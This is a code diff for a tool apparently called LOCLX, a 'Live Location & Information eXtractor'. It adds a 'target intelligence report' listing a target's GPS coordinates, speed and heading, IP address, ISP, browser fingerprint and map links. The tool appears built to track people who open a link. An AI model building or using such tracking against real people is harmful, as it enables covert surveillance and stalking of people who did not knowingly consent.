@@ -1,4 +1,4 @@
-"""Live terminal dashboard renderer for LOCLX v2.1.0."""
+"""Live terminal dashboard renderer and target report generator for LOCLX v2.1.2."""
 
 from __future__ import annotations
 
@@ -12,7 +12,7 @@ from loclx.utils import Ansi, format_distance, format_uptime
 
 
 class TerminalDashboard:
-    """Renders formatted terminal dashboard for LOCLX sessions."""
+    """Renders formatted terminal dashboard and target report for LOCLX sessions."""
 
     def __init__(self, ansi: Optional[Ansi] = None) -> None:
         self.c = ansi or Ansi(True)
@@ -21,8 +21,8 @@ class TerminalDashboard:
         banner_art = r"""
 ╔════════════════════════════════════════════════════════════╗
 ║                         LOCLX                              ║
-║          Live Location & Information eXtractor             ║
-║                         v2.1.0                             ║
+║     LIVE LOCATION & INFORMATION eXTRACTOR                  ║
+║                         v2.1.2                             ║
 ╚════════════════════════════════════════════════════════════╝"""
         return self.c.green(banner_art)
 
@@ -54,8 +54,8 @@ class TerminalDashboard:
         if fix:
             lat = fix.get("lat")
             lon = fix.get("lon")
-            lat_s = f"{lat:.6f}" if lat is not None else "n/a"
-            lon_s = f"{lon:.6f}" if lon is not None else "n/a"
+            lat_s = f"{lat:.9f}" if lat is not None else "n/a"
+            lon_s = f"{lon:.9f}" if lon is not None else "n/a"
             lines.extend([
                 line(f"Latitude     {lat_s}"),
                 line(f"Longitude    {lon_s}"),
@@ -112,3 +112,117 @@ class TerminalDashboard:
 
         lines.append(c.green(bot_border))
         return "\n".join(lines)
+
+
+def generate_target_report(session: Session, c: Optional[Ansi] = None) -> str:
+    """Generate a comprehensive Hound-style target intelligence report."""
+    ansi = c or Ansi(True)
+    d = session.to_dict()
+
+    sep = ansi.dim("──────────────────────────────────────────────")
+    header_sep = ansi.green("══════════════════════════════════════════════")
+
+    lines = [
+        ansi.bold(ansi.cyan("LOCLX — TARGET INFORMATION")),
+        header_sep,
+        "",
+        ansi.bold(ansi.cyan("SESSION")),
+        sep,
+        f"{'ID':<16}: {d['id']}",
+        f"{'STATUS':<16}: {d['status']}",
+        f"{'FIRST SEEN':<16}: {d.get('first_seen') or '—'}",
+        f"{'LAST SEEN':<16}: {d.get('last_seen') or '—'}",
+        f"{'UPDATES':<16}: {d['gpsUpdates']}",
+        "",
+        ansi.bold(ansi.cyan("DEVICE / BROWSER")),
+        sep,
+    ]
+
+    b = d.get("browserInfo") or {}
+    lines.extend([
+        f"{'Browser':<16}: {b.get('browser') or '—'}",
+        f"{'Browser Version':<16}: {b.get('browserVersion') or '—'}",
+        f"{'Platform':<16}: {b.get('platform') or '—'}",
+        f"{'User Agent':<16}: {b.get('userAgent') or '—'}",
+        f"{'Language':<16}: {b.get('language') or '—'}",
+        f"{'Timezone':<16}: {b.get('timezone') or '—'}",
+        f"{'Screen':<16}: {b.get('screenResolution') or '—'}",
+        f"{'Viewport':<16}: {b.get('viewportSize') or '—'}",
+        f"{'CPU Cores':<16}: {b.get('cpuCores') or '—'}",
+        f"{'DPR':<16}: {b.get('devicePixelRatio') or '1'}",
+        f"{'Touch':<16}: {b.get('touchSupport') or '—'}",
+        f"{'Device Type':<16}: {b.get('deviceType') or 'Desktop'}",
+        "",
+        ansi.bold(ansi.cyan("NETWORK")),
+        sep,
+    ])
+
+    ip = d.get("ipInfo") or {}
+    lines.extend([
+        f"{'Public IP':<16}: {ip.get('ip') or '—'}",
+        f"{'Country':<16}: {ip.get('country') or '—'}",
+        f"{'Region':<16}: {ip.get('region') or '—'}",
+        f"{'City':<16}: {ip.get('city') or '—'}",
+        f"{'ISP':<16}: {ip.get('isp') or '—'}",
+        f"{'Organization':<16}: {ip.get('org') or '—'}",
+        f"{'ASN':<16}: {ip.get('asn') or '—'}",
+        f"{'Reverse DNS':<16}: {ip.get('hostname') or '—'}",
+        "",
+        ansi.bold(ansi.cyan("IP LOCATION")),
+        sep,
+        f"{'Latitude':<16}: {ip.get('lat') if ip.get('lat') is not None else '—'}",
+        f"{'Longitude':<16}: {ip.get('lon') if ip.get('lon') is not None else '—'}",
+        f"{'Precision':<16}: APPROXIMATE",
+        "",
+        ansi.bold(ansi.green("GPS LOCATION")),
+        sep,
+    ])
+
+    fix = d.get("currentFix") or {}
+    if fix:
+        lines.extend([
+            f"{'Latitude':<16}: {fix.get('lat'):.9f}",
+            f"{'Longitude':<16}: {fix.get('lon'):.9f}",
+            f"{'Accuracy':<16}: {format_accuracy(fix.get('accuracy'))}",
+            f"{'Altitude':<16}: {fix.get('altitude') or 'n/a'}",
+            f"{'Speed':<16}: {fix.get('speed') or 0:.1f} m/s",
+            f"{'Heading':<16}: {fix.get('heading') or 0:.0f}°",
+            f"{'Timestamp':<16}: {fix.get('timestamp') or '—'}",
+        ])
+    else:
+        lines.append(ansi.amber("Waiting for location permission grant..."))
+
+    lines.extend([
+        "",
+        ansi.bold(ansi.cyan("MAP LINKS")),
+        sep,
+    ])
+
+    if fix and "lat" in fix and "lon" in fix:
+        lat = fix["lat"]
+        lon = fix["lon"]
+        lat_lon_s = f"{lat:.9f},{lon:.9f}"
+        lines.extend([
+            f"{'Google Maps':<16}: https://www.google.com/maps/search/?api=1&query={lat_lon_s}",
+            f"{'Google Earth':<16}: https://earth.google.com/web/search/{lat_lon_s}",
+            f"{'OpenStreetMap':<16}: https://www.openstreetmap.org/?mlat={lat:.6f}&mlon={lon:.6f}#map=16/{lat:.6f}/{lon:.6f}",
+        ])
+    else:
+        lines.append("GPS Fix: None available yet.")
+
+    lines.extend([
+        "",
+        ansi.bold(ansi.amber("ANALYSIS")),
+        sep,
+    ])
+
+    diff = d.get("diffMeters")
+    if diff is not None:
+        lines.append(f"{'GPS → IP':<16}: {format_distance(diff)}")
+    else:
+        lines.append(f"{'GPS → IP':<16}: —")
+    lines.append(f"{'GPS precision':<16}: BROWSER REPORTED")
+    lines.append(f"{'IP precision':<16}: APPROXIMATE")
+    lines.append(header_sep)
+
+    return "\n".join(lines)
